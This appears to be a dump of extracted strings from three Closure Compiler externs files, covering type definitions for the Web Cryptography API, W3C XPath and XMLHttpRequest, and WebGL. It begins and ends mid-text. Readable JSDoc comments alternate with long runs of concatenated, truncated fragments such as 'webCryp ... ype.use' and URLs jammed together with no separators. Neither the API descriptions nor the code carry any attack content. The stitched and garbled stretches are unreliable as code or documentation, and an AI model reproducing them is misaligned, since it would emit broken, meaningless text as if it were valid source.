information about any third and subsequent primes, should they exist.!Array.<!webCrypto.RsaOtherPrimesInfo>Array.<!webCrypto.RsaOtherPrimesInfo>!webCrypto.RsaOtherPrimesInfowebCrypto.RsaOtherPrimesInfoContains the value of the symmetric (or other
single-valued) key.http://www.w3.org/TR/WebCryptoAPI/#dfn-RsaOtherPrimesInfo
Section-6.3.2.7:
https://tools.ietf.org/html/draft-ietf-jose-json-web-algorithms-40Parameter within an "oth" array member represents the value
of a subsequent prime factor.Parameter within an "oth" array member represents the CRT
exponent of the corresponding prime factor.Parameter within an "oth" array member represents the CRT
coefficient of the corresponding prime factor.http://www.w3.org/TR/WebCryptoAPI/#subtlecrypto-interfaceSupported
values are: AES-CBC, AES-CTR, AES-GCM, and RSA-OAEP.
!webCrypto.AlgorithmIdentifierwebCrypto.AlgorithmIdentifierKey to be used for signing.
!webCrypto.CryptoKeywebCrypto.CryptoKeyData to be encrypted (cleartext).
Ciphertext generated by the encryption of the
cleartext.Data to be decrypted (ciphertext).
Cleartext generated by the decryption of the
ciphertext.Supported
values are: HMAC, RSASSA-PKCS1-v1_5, and ECDSA.
Private key to be used for signing.
Data to be signed.
Returns the signature on success.Signature to verify.
Data whose signature needs to be verified.
Returns a boolean indicating if the signature operating
has been successful.Supported
values are: SHA-1, SHA-256, SHA-384, and SHA-512.
Data to be hashed using the hashing algorithm.
returns the hash on success.If the key can be extracted from the CryptoKey
object at a later stage.
Indication of new key options i.e.
encrypt, decrypt, sign, verify, deriveKey, deriveBits, wrapKey,
unwrapKey.
returns the generated key as a CryptoKey or a
CryptoKeyPair.The key derivation
algorithm to use. Supported values are:  ECDH, DH, PBKDF2, and HKDF-CTR.
Key to be used by the key
derivation algorithm.
Defines the key
derivation algorithm to use.
Indicates if the key can be extracted from the
CryptoKey object at a later stage.
Indicates what can be done with the
derivated key.
The key derivation
algorithm to use.
Enumerated value describing the data
format of the key to imported.
The key
in the given format.
(!BufferSource|!webCrypto.JsonWebKey)!webCrypto.JsonWebKeywebCrypto.JsonWebKeySupported values
are: AES-CTR, AES-CBC, AES-GCM, RSA-OAEP, AES-KW, HMAC,
RSASSA-PKCS1-v1_5, ECDSA, ECDH, DH.
returns the generated key as a CryptoKey.CryptoKey to export.
returns the key in the requested format.Value describing the data format in which the key must
be wrapped. It can be one of the following: raw, pkcs8, spki, jwk.
CryptoKey to wrap.
CryptoKey used to perform
the wrapping.
algorithm used
to perform the wrapping. It is one of the following: AES-CBC, AES-CTR,
AES-GCM, RSA-OAEP, and AES-KW.
returns the wrapped key in the requested format.Contains the wrapped key in the given
format.
CryptoKey used to perform
the unwrapping.
Algorithm
used to perform the unwrapping. It is one of the following: AES-CBC,
AES-CTR, AES-GCM, RSA-OAEP, and AES-KW.
Represents the algorithm of the wrapped key.
returns the unwrapped key as a CryptoKey.Web Cryptography APIhttp://www.w3.org/TR/WebCryptoAPI/https://developer.mozilla.org/en/DOM/window.crypto.getRandomValues
webCrypto.SubtleCryptohttp://www.w3.org/TR/WebCryptoAPI/#Crypto-attribute-subtlevar webCrypto = {};webCrypto = {}webCrypto.Algorithm;webCryp ... tifier;webCryp ... ntifierwebCryp ... n() {};webCryp ... on() {}webCryp ... e.type;webCryp ... pe.typewebCryp ... ototypewebCryp ... ctable;webCryp ... actablewebCryp ... orithm;webCryp ... gorithmwebCryp ... usages;webCryp ... .usageswebCryp ... pe.kty;webCryp ... ype.ktywebCryp ... pe.use;webCryp ... ype.usewebCryp ... ey_ops;webCryp ... key_opswebCryp ... pe.alg;webCryp ... ype.algwebCryp ... pe.ext;webCryp ... ype.extwebCryp ... pe.crv;webCryp ... ype.crvwebCryp ... type.x;webCryp ... otype.xwebCryp ... type.y;webCryp ... otype.ywebCryp ... type.d;webCryp ... otype.dwebCryp ... type.n;webCryp ... otype.nwebCryp ... type.e;webCryp ... otype.ewebCryp ... type.p;webCryp ... otype.pwebCryp ... type.q;webCryp ... otype.qwebCryp ... ype.dp;webCryp ... type.dpwebCryp ... ype.dq;webCryp ... type.dqwebCryp ... ype.qi;webCryp ... type.qiwebCryp ... pe.oth;webCryp ... ype.othwebCryp ... type.k;webCryp ... otype.kwebCryp ... mesInfowebCryp ... type.r;webCryp ... otype.rwebCryp ... type.t;webCryp ... otype.twebCryp ... eCryptowebCryp ... ta) {};webCryp ... ata) {}webCryp ... encryptwebCryp ... decryptwebCryp ... pe.signwebCryp ... .verifywebCryp ... .digestwebCryp ... es) {};webCryp ... ges) {}webCryp ... rateKeyfunctio ... ges) {}webCryp ... riveKeywebCryp ... th) {};webCryp ... gth) {}webCryp ... iveBitswebCryp ... portKeywebCryp ... ey) {};webCryp ... key) {}webCryp ... hm) {};webCryp ... thm) {}webCryp ... wrapKeyunwrapp ... gorithmWindow. ... ay) {};Window. ... ray) {}Window. ... mValuesfunctio ... ray) {}Window. ... subtle;Window. ... .subtle/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_xml.js
 * @fileoverview Definitions for W3C's XML related specifications.
 *  This file depends on w3c_dom2.js.
 *  The whole file has been fully type annotated.
 *
 *  Provides the XML standards from W3C.
 *   Includes:
 *    XPath          - Fully type annotated
 *    XMLHttpRequest - Fully type annotated
 *
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html
 * @see http://www.w3.org/TR/XMLHttpRequest/
 * @see http://www.w3.org/TR/XMLHttpRequest2/
 *
 * @externs
 * @author stevey@google.com (Steve Yegge)
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathException
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#INVALID_EXPRESSION_ERR
 /**\n *  ... ERR\n */
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#TYPE_ERR
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#
 /**\n *  ... ml#\n */
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator
 
 * @param {string} expr
 * @param {?XPathNSResolver=} opt_resolver
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createExpression
 * @throws XPathException
 * @throws DOMException
 * @return {undefined}
 
 * @param {Node} nodeResolver
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createNSResolver
 * @return {undefined}
 
 * @param {string} expr
 * @param {Node} contextNode
 * @param {?XPathNSResolver=} opt_resolver
 * @param {?number=} opt_type
 * @param {*=} opt_result
 * @return {XPathResult}
 * @throws XPathException
 * @throws DOMException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-evaluate
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression
 
 * @param {Node} contextNode
 * @param {number=} opt_type
 * @param {*=} opt_result
 * @return {*}
 * @throws XPathException
 * @throws DOMException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression-evaluate
 
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver
 /**\n *  ... ver\n */
 * @param {string} prefix
 * @return {?string}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver-lookupNamespaceURI
 
 * From http://www.w3.org/TR/xpath
 *
 * XPath is a language for addressing parts of an XML document, designed to be
 * used by both XSLT and XPointer.
 *
 * @noalias
 * @constructor
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult
 /**\n *  ... ult\n */
 * @type {boolean} {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-booleanValue
 
 * @type {boolean} {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-invalid-iterator-state
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-numberValue
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-resultType
 
 * @type {Node}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-singleNodeValue
 
 * @type {number}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshot-length
 
 * @type {string}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-stringValue
 
 * @return {Node}
 * @throws XPathException {@see XPathException.TYPE_ERR}
 * @throws DOMException {@see DOMException.INVALID_STATE_ERR}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-iterateNext
 
 * @param {number} index
 * @return {Node}
 * @throws XPathException
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshotItem
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-NUMBER-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-STRING-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-BOOLEAN-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-ITERATOR-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-ITERATOR-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-SNAPSHOT-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-SNAPSHOT-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-UNORDERED-NODE-TYPE
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-FIRST-ORDERED-NODE-TYPE
 
 * @constructor
 * @extends {Node}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace
 
 * @type {Element}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace-ownerElement
 
 * @type {number}
 * @see http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPATH_NAMESPACE_NODE
 /**\n *  ... ODE\n */
 * From http://www.w3.org/TR/XMLHttpRequest/
 *
 * (Draft)
 *
 * The XMLHttpRequest Object specification defines an API that provides
 * scripted client functionality for transferring data between a client and a
 * server.
 *
 * @constructor
 * @implements {EventTarget}
 * @see http://www.w3.org/TR/XMLHttpRequest/#xmlhttprequest-object
 
 * @param {string} method
 * @param {string} url
 * @param {?boolean=} opt_async
 * @param {?string=} opt_user
 * @param {?string=} opt_password
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-open()-method
 
 * @param {string} header
 * @param {string} value
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-setrequestheader()-method
 
 * @param {ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string=} opt_data
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-send()-method
 
 * @return {undefined}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-abort()-method
 
 * @return {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-getallresponseheaders()-method
 
 * @param {string} header
 * @return {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-getresponseheader()-method
 
 * @type {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-responsetext-attribute
 
 * This is not supported in any IE browser (as of August 2016).
 * @type {string}
 * @see https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL
 /**\n *  ... URL\n */
 * @type {Document}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-responsexml-attribute
 
 * @type {number}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-readystate-attribute
 
 * @type {number}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-status-attribute
 
 * @type {string}
 * @see http://www.w3.org/TR/XMLHttpRequest/#the-statustext-attribute
 
 * @type {Function}
 * @see http://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onreadystatechange
 
 * @type {Function}
 * @see http://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onerror
 
 * @type {number}
 * @see https://www.w3.org/TR/XMLHttpRequest/#states
 
 * The FormData object represents an ordered collection of entries. Each entry
 * has a name and value.
 *
 * @param {?Element=} opt_form An optional form to use for constructing the form
 *     data set.
 * @constructor
 * @see http://www.w3.org/TR/XMLHttpRequest2/#the-formdata-interface
 
 * @param {string} name
 * @param {Blob|string} value
 * @param {string=} opt_filename
 * @return {undefined}
 XPathExceptionINVALID_EXPRESSION_ERR52TYPE_ERRXPathEvaluatorcreateExpressionopt_resolvernodeResolvercontextNodeopt_resultXPathExpressionXPathNSResolverXPathResultbooleanValueinvalidInteratorStatenumberValueresultTypesingleNodeValuesnapshotLengthiterateNextsnapshotItemANY_TYPENUMBER_TYPESTRING_TYPEBOOLEAN_TYPEUNORDERED_NODE_ITERATOR_TYPEORDERED_NODE_ITERATOR_TYPEUNORDERED_NODE_SNAPSHOT_TYPEORDERED_NODE_SNAPSHOT_TYPEANY_UNORDERED_NODE_TYPEFIRST_ORDERED_NODE_TYPEXPathNamespaceopt_asyncopt_useropt_passwordsetRequestHeaderheadergetAllResponseHeadersgetResponseHeaderresponseURLresponseXMLUNSENTOPENEDHEADERS_RECEIVEDopt_filenameDefinitions for W3C's XML related specifications.
This file depends on w3c_dom2.js.
The whole file has been fully type annotated.
*  Provides the XML standards from W3C.
Includes:
XPath          - Fully type annotated
XMLHttpRequest - Fully type annotated
*http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html
http://www.w3.org/TR/XMLHttpRequest/
http://www.w3.org/TR/XMLHttpRequest2/
*http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExceptionhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#INVALID_EXPRESSION_ERRhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#TYPE_ERRhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator?XPathNSResolver=?XPathNSResolverhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createExpression
XPathException
DOMException
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-createNSResolver
?number=http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathEvaluator-evaluatehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpressionhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathExpression-evaluatehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolverhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNSResolver-lookupNamespaceURIFrom http://www.w3.org/TR/xpath

XPath is a language for addressing parts of an XML document, designed to be
used by both XSLT and XPointer.http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult{@see XPathException.TYPE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-booleanValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-invalid-iterator-stateXPathException {@see XPathException.TYPE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-numberValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-resultTypehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-singleNodeValuehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshot-lengthhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-stringValueDOMException {@see DOMException.INVALID_STATE_ERR}
http://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-iterateNexthttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-snapshotItemhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-NUMBER-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-STRING-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-BOOLEAN-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-ITERATOR-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-ITERATOR-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-UNORDERED-NODE-SNAPSHOT-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ORDERED-NODE-SNAPSHOT-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-ANY-UNORDERED-NODE-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathResult-FIRST-ORDERED-NODE-TYPEhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespacehttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPathNamespace-ownerElementhttp://www.w3.org/TR/DOM-Level-3-XPath/xpath.html#XPATH_NAMESPACE_NODEFrom http://www.w3.org/TR/XMLHttpRequest/

(Draft)

The XMLHttpRequest Object specification defines an API that provides
scripted client functionality for transferring data between a client and a
server.http://www.w3.org/TR/XMLHttpRequest/#xmlhttprequest-objecthttp://www.w3.org/TR/XMLHttpRequest/#the-open()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-setrequestheader()-method(ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string)=(ArrayBuffer|ArrayBufferView|Blob|Document|FormData|string)http://www.w3.org/TR/XMLHttpRequest/#the-send()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-abort()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-getallresponseheaders()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-getresponseheader()-methodhttp://www.w3.org/TR/XMLHttpRequest/#the-responsetext-attributeThis is not supported in any IE browser (as of August 2016).https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURLhttp://www.w3.org/TR/XMLHttpRequest/#the-responsexml-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-readystate-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-status-attributehttp://www.w3.org/TR/XMLHttpRequest/#the-statustext-attributehttp://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onreadystatechangehttp://www.w3.org/TR/XMLHttpRequest/#handler-xhr-onerrorhttps://www.w3.org/TR/XMLHttpRequest/#statesThe FormData object represents an ordered collection of entries. Each entry
has a name and value.An optional form to use for constructing the form
data set.
?Element=http://www.w3.org/TR/XMLHttpRequest2/#the-formdata-interface(Blob|string)XPathEx ... R = 52;XPathEx ... RR = 52XPathEx ... ION_ERRXPathEx ... YPE_ERRXPathEx ... e.code;XPathEx ... pe.codeXPathEx ... ototypeXPathEv ... er) {};XPathEv ... ver) {}XPathEv ... ressionXPathEv ... ototypeXPathEv ... esolverXPathEv ... lt) {};XPathEv ... ult) {}XPathEv ... valuatefunctio ... ult) {}XPathEx ... lt) {};XPathEx ... ult) {}XPathEx ... valuateXPathNS ... ix) {};XPathNS ... fix) {}XPathNS ... paceURIXPathNS ... ototypeXPathRe ... nValue;XPathRe ... anValueXPathRe ... ototypeXPathRe ... rState;XPathRe ... orStateinvalid ... orStateXPathRe ... rValue;XPathRe ... erValueXPathRe ... ltType;XPathRe ... ultTypeXPathRe ... eValue;XPathRe ... deValueXPathRe ... Length;XPathRe ... tLengthXPathRe ... gValue;XPathRe ... ngValueXPathRe ... n() {};XPathRe ... on() {}XPathRe ... ateNextXPathRe ... ex) {};XPathRe ... dex) {}XPathRe ... hotItemXPathRe ... PE = 0;XPathRe ... YPE = 0XPathResult.ANY_TYPEXPathRe ... PE = 1;XPathRe ... YPE = 1XPathRe ... ER_TYPEXPathRe ... PE = 2;XPathRe ... YPE = 2XPathRe ... NG_TYPEXPathRe ... PE = 3;XPathRe ... YPE = 3XPathRe ... AN_TYPEXPathRe ... PE = 4;XPathRe ... YPE = 4XPathRe ... OR_TYPEUNORDER ... OR_TYPEXPathRe ... PE = 5;XPathRe ... YPE = 5ORDERED ... OR_TYPEXPathRe ... PE = 6;XPathRe ... YPE = 6XPathRe ... OT_TYPEUNORDER ... OT_TYPEXPathRe ... PE = 7;XPathRe ... YPE = 7ORDERED ... OT_TYPEXPathRe ... PE = 8;XPathRe ... YPE = 8XPathRe ... DE_TYPEANY_UNO ... DE_TYPEXPathRe ... PE = 9;XPathRe ... YPE = 9FIRST_O ... DE_TYPEXPathNa ... lement;XPathNa ... ElementXPathNa ... ototypeXPathNa ... E = 13;XPathNa ... DE = 13XPathNa ... CE_NODEXMLHttp ... rd) {};XMLHttp ... ord) {}XMLHttp ... pe.openXMLHttp ... ue) {};XMLHttp ... lue) {}XMLHttp ... tHeaderXMLHttp ... ta) {};XMLHttp ... ata) {}XMLHttp ... pe.sendXMLHttp ... n() {};XMLHttp ... on() {}XMLHttp ... e.abortXMLHttp ... HeadersgetAllR ... HeadersXMLHttp ... er) {};XMLHttp ... der) {}XMLHttp ... eHeaderfunction(header) {}XMLHttp ... seText;XMLHttp ... nseTextXMLHttp ... nseURL;XMLHttp ... onseURLXMLHttp ... nseXML;XMLHttp ... onseXMLXMLHttp ... yState;XMLHttp ... dyStateXMLHttp ... status;XMLHttp ... .statusXMLHttp ... usText;XMLHttp ... tusTextXMLHttp ... change;XMLHttp ... echangeXMLHttp ... nerror;XMLHttp ... onerrorXMLHttp ... UNSENT;XMLHttp ... .UNSENTXMLHttp ... OPENED;XMLHttp ... .OPENEDXMLHttp ... CEIVED;XMLHttp ... ECEIVEDXMLHttp ... OADING;XMLHttp ... LOADINGXMLHttpRequest.DONE;XMLHttpRequest.DONEFormDat ... me) {};FormDat ... ame) {}FormDat ... .appendFormData.prototype/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/webgl.js
 * @fileoverview Definitions for WebGL functions as described at
 * http://www.khronos.org/registry/webgl/specs/latest/
 *
 * This file is current up to the WebGL 1.0.1 spec, including extensions.
 *
 * This relies on html5.js being included for Canvas and Typed Array support.
 *
 * This includes some extensions defined at
 * http://www.khronos.org/registry/webgl/extensions/
 *
 * @externs
 
 * @type {!HTMLCanvasElement}
 
 * @return {!WebGLContextAttributes}
 * @nosideeffects
 
 * @return {!Array<string>}
 * @nosideeffects
 
 * Note that this has side effects by enabling the extension even if the
 * result is not used.
 * @param {string} name
 * @return {Object}
 
 * @param {number} texture
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {WebGLShader} shader
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {number} index
 * @param {string} name
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLBuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLFramebuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLRenderbuffer} buffer
 * @return {undefined}
 
 * @param {number} target
 * @param {WebGLTexture} texture
 * @return {undefined}
 
 * @param {number} red
 * @param {number} green
 * @param {number} blue
 * @param {number} alpha
 * @return {undefined}
 
 * @param {number} mode
 * @return {undefined}
 
 * @param {number} modeRGB
 * @param {number} modeAlpha
 * @return {undefined}
 
 * @param {number} sfactor
 * @param {number} dfactor
 * @return {undefined}
 
 * @param {number} srcRGB
 * @param {number} dstRGB
 * @param {number} srcAlpha
 * @param {number} dstAlpha
 * @return {undefined}
 
 * @param {number} target
 * @param {ArrayBufferView|ArrayBuffer|number} data
 * @param {number} usage
 * @return {undefined}
 
 * @param {number} target
 * @param {number} offset
 * @param {ArrayBufferView|ArrayBuffer} data
 * @return {undefined}
 
 * @param {number} target
 * @return {number}
 
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} depth
 * @return {undefined}
 
 * @param {number} s
 * @return {undefined}
 
 * @param {boolean} red
 * @param {boolean} green
 * @param {boolean} blue
 * @param {boolean} alpha
 * @return {undefined}
 
 * @param {WebGLShader} shader
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} internalformat
 * @param {number} width
 * @param {number} height
 * @param {number} border
 * @param {ArrayBufferView} data
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} width
 * @param {number} height
 * @param {number} format
 * @param {ArrayBufferView} data
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} format
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @param {number} border
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @return {!WebGLBuffer}
 * @nosideeffects
 
 * @return {!WebGLFramebuffer}
 * @nosideeffects
 
 * @return {!WebGLProgram}
 * @nosideeffects
 
 * @return {!WebGLRenderbuffer}
 * @nosideeffects
 
 * @param {number} type
 * @return {!WebGLShader}
 * @nosideeffects
 
 * @return {!WebGLTexture}
 * @nosideeffects
 
 * @param {WebGLBuffer} buffer
 * @return {undefined}
 
 * @param {WebGLFramebuffer} buffer
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @return {undefined}
 
 * @param {WebGLRenderbuffer} buffer
 * @return {undefined}
 
 * @param {WebGLTexture} texture
 * @return {undefined}
 
 * @param {number} func
 * @return {undefined}
 
 * @param {boolean} flag
 * @return {undefined}
 
 * @param {number} nearVal
 * @param {number} farVal
 * @return {undefined}
 
 * @param {number} flags
 * @return {undefined}
 
 * @param {number} index
 * @return {undefined}
 
 * @param {number} mode
 * @param {number} first
 * @param {number} count
 * @return {undefined}
 
 * @param {number} mode
 * @param {number} count
 * @param {number} type
 * @param {number} offset
 * @return {undefined}
 
 * @param {number} cap
 * @return {undefined}
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} renderbuffertarget
 * @param {WebGLRenderbuffer} renderbuffer
 * @return {undefined}
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} textarget
 * @param {WebGLTexture} texture
 * @param {number} level
 * @return {undefined}
 
 * @param {number} target
 * @return {undefined}
 
 * @param {WebGLProgram} program
 * @param {number} index
 * @return {WebGLActiveInfo}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @return {!Array<WebGLShader>}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {string} name
 * @return {number}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} attachment
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @return {string}
 * @nosideeffects
 
 * @param {WebGLShader} shader
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} shadertype
 * @param {number} precisiontype
 * @return {WebGLShaderPrecisionFormat}
 * @nosideeffects
 
 * @param {WebGLShader} shader
 * @return {string}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {WebGLUniformLocation} location
 * @return {*}
 * @nosideeffects
 
 * @param {WebGLProgram} program
 * @param {string} name
 * @return {WebGLUniformLocation}
 * @nosideeffects
 
 * @param {number} index
 * @param {number} pname
 * @return {*}
 * @nosideeffects
 
 * @param {number} index
 * @param {number} pname
 * @return {number}
 * @nosideeffects
 
 * @param {number} target
 * @param {number} mode
 * @return {undefined}
 
 * @param {WebGLObject} buffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {number} cap
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} framebuffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} program
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} renderbuffer
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} shader
 * @return {boolean}
 * @nosideeffects
 
 * @param {WebGLObject} texture
 * @return {boolean}
 * @nosideeffects
 
 * @param {number} width
 * @return {undefined}
 
 * @param {number} pname
 * @param {number} param
 * @return {undefined}
 
 * @param {number} factor
 * @param {number} units
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @param {number} format
 * @param {number} type
 * @param {ArrayBufferView} pixels
 * @return {undefined}
 
 * @param {number} target
 * @param {number} internalformat
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @param {number} coverage
 * @param {boolean} invert
 * @return {undefined}
 
 * @param {number} x
 * @param {number} y
 * @param {number} width
 * @param {number} height
 * @return {undefined}
 
 * @param {WebGLShader} shader
 * @param {string} source
 * @return {undefined}
 
 * @param {number} func
 * @param {number} ref
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} face
 * @param {number} func
 * @param {number} ref
